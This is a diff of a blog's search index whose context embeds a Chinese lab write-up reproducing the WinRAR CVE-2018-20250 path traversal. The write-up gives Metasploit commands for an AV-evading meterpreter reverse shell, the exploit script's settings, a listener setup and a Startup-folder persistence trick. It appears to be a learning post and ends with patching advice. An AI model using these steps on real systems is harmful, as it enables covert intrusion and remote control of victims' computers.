@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[gittalk]]></title>
+    <url>%2Fgitalk%2F</url>
+    <content type="text"><![CDATA[https://asdfv1929.github.io/2018/01/20/gitalk/]]></content>
+      <categories>
+        <category>博客搭建</category>
+      </categories>
+      <tags>
+        <tag>博客搭建</tag>
+        <tag>gitalk</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[CVE-2018-20250（WinRAR目录穿越漏洞）复现]]></title>
     <url>%2Fwinrar-CVE-2018-20250%E5%A4%8D%E7%8E%B0%2F</url>
     <content type="text"><![CDATA[前言 复现准备 复现过程 后记 一.前言2月下旬，著名压缩软件WinRAR被曝高危漏洞，全球已有超过5亿用户受到影响。该漏洞一旦被黑客利用，黑客就能将恶意程序植入使用者电脑的开机程序中，该漏洞在2005年便已经存在。 本文在虚拟环境中，使用Metasploit对漏洞攻击进行复现，展示其攻击过程，供大家学习和参考。 二.复现准备1.漏洞描述该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。该动态链接库的作用是处理 ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。 2.漏洞影响 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.复现环境虚拟环境搭建：VMware Workstation 15 pro 网络模式：NAT 攻击机：kali Linux 2019.1 IP:192.168.28.136 靶机：Windows 7 ultimate sp1 x64 IP:192.168.28.128 三.复现过程1.使用Metasploit5生成免杀Payload在kali Linux中输入msfconsole命令启动Metasploit 在Metasploit中依次输入 1234use evasion/windows/windows_defender_exeshow infoset filename WinRAR.exeset payload windows/meterpreter/reverse_tcp 输入show options查看配置 使用如下命令修改配置 12set lhost 192.168.28.136set lport 12345 修改完成后输入run运行，提示生成如下文件 2.使用exp生成恶意文件exp下载：https://github.com/WyAtu/CVE-2018-20250/ 2.1修改exp.py文件将exp.py中的evil_filename“的值改为&quot;WinRAR.exe&quot;，将target_filename的值改为&quot;.\hi.exe&quot; 2.2生成恶意文件将刚才使用Metasploit生成的WinRAR.exe文件复制到下载的exp文件夹内，使用python exp.py命令生成恶意程序test.rar 值得注意的是，执行此命令需要python3以上的环境，另外如果在Linux系统中执行不成功可以尝试使用Windows系统来执行 3.在kali Linux中使用Metasploit监听靶机在Linux终端中运行如下命令 1234567msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.28.128set lport 12345run 4.在靶机上运行恶意程序将test.rar文件放入靶机，解压该文件，解压后会生成如下文件 双击执行hi.exe文件，此时kali Linux中会收到会话，即可获得靶机权限 四.后记以上便是使用CVE-2018-20250漏洞对靶机进行攻击的整个复现过程，我们看到病毒可以通过恶意压缩包进行传播，在本次复现中，我们将病毒文件直接解压在压缩文件解压的目标文件夹中并手动运行的，其实我们是可以通过修改exp.py文件中target_filename的值来修改病毒文件解压出来的位置，例如对win7系统的靶机，我们可以将值修改为r&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe&quot;，这样病毒文件就会在下次开机是自动启动，悄无声息的完成对电脑的攻击。 大家可以留意一下自己电脑中压缩软件的版本，选择最新版本的软件即可防止此类攻击，同时也要养成好的习惯，不随意下载和使用不明来源的压缩文件]]></content>
@@ -50,8 +62,8 @@
         <category>博客搭建</category>
       </categories>
       <tags>
-        <tag>随笔</tag>
         <tag>博客搭建</tag>
+        <tag>随笔</tag>
       </tags>
   </entry>
 </search>
